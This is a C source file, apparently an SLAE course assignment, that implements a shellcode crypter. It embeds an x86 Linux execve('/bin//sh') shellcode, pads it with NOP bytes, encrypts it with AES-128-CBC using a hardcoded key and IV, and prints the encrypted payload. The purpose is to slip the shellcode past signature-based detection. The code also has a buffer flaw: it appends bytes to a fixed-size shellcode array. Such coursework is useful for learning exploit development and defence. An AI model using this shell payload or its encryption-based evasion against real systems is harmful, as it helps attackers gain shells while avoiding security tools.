#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <time.h>

#define CBC 1

#include "aes.h"

unsigned char shellcode[] = \
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

unsigned char key[] = "slae_assignment7";

int main ()
{
	// This will pad the Shellcode with nops automatically
	// The shellcode needs to be multiple of 16 due to AES CBC block size

        printf("Original Shellcode:\n");
	unsigned char byte;

        for (int counter=0; counter < strlen(shellcode); counter++)
        {
                byte = shellcode[counter];
                printf("\\x%02x", byte);
        }

	char nop[] = "\x90";

	while ((strlen(shellcode) % 16) != 0)
	{
		strcat(shellcode, nop);
	}

	size_t len = strlen(shellcode);
	char * fshellcode = (char *)malloc(len);
	memcpy(fshellcode, shellcode, len);

	unsigned char encrypted_byte, key_byte;

	uint8_t iv[]  = { 0xFC, 0xBA, 0x11, 0xEF, 0x99, 0x8C, 0x1A, 0xC7, 0xEE, 0xD9, 0x51, 0x64, 0x9D, 0xFA, 0x55, 0xAA };


	unsigned char* dst_buffer = malloc(strlen(fshellcode));

	AES128_CBC_encrypt_buffer(dst_buffer, fshellcode, strlen(fshellcode), key, iv);

	printf("\n\nAES encryption Key:\n");

	for (int counter=0; counter < 16; counter++)
	{
		key_byte = key[counter];
		printf("\\x%02x", key_byte);

	}

	printf("\n\n");
	printf("AES Encrypted Shellcode:\n");

	for (int counter=0; counter < strlen(fshellcode); counter++)
	{
		encrypted_byte = dst_buffer[counter];
		printf("\\x%02x", encrypted_byte);
	}

	printf("\n");
	free(dst_buffer);

	return 0;
}
